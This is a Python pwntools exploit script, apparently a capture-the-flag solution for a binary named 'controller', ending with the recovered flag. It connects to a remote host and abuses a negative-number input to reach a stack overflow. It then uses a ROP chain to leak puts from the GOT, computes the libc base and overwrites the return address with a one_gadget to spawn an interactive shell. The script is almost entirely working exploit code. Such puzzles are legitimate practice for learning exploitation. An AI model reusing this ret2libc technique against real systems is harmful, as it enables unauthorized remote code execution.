from pwn import *

#Note: The ld_preload trick tends not to work on Kali. I have a bionic beaver VM I run these on if necessary.
#target = process('./controller', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "\nb *calculator+151\n set disassembly-flavor intel\ncontinue")

#Insert here
target = remote('206.189.121.131', 30388)

elf = ELF("controller")
libc = ELF("libc.so.6")

#Gadgets:

puts_got_plt = p64(0x601fb0)
puts_plt = p64(0x00400630)
pop_rdi = p64(0x00000000004011d3) # : pop rdi ; ret
main = p64(0x00401124)
onegadget_offset = 0x4f3d5

print(target.recvuntil(b'Insert the amount of 2 different types of recources:'))

#I can hit the error with -18 11 then 3
target.sendline(b'-18')
target.sendline(b'11')

print(target.recvuntil(b'4.'))
	
target.sendline(b'3')

print(target.recvuntil(b'Do you want to report the problem?'))

padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += puts_got_plt
payload += puts_plt
payload += main

target.sendline(payload)
result = target.recvuntil(b'Control Room')
result_list = result.split(b'\n')
leak_unproc = result_list[2]
leak_unproc += b'\x00' * 2
puts_libc = u64(leak_unproc)

print(hex(puts_libc))
libc_base = puts_libc - libc.symbols['puts']
strlen_libc = libc_base + libc.symbols["strlen"]
onegadget = libc_base + onegadget_offset
#Verifying my offsets work. I compare the output here with the GOT entry for strlen in gdb.
print(hex(strlen_libc))

print(target.recvuntil(b'Insert the amount of 2 different types of recources:'))
target.sendline(b'-18')
target.sendline(b'11')
print(target.recvuntil(b'4.'))
target.sendline(b'3')
print(target.recvuntil(b'Do you want to report the problem?'))


payload = padding
payload += p64(onegadget)
target.sendline(payload)

target.interactive()

#CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
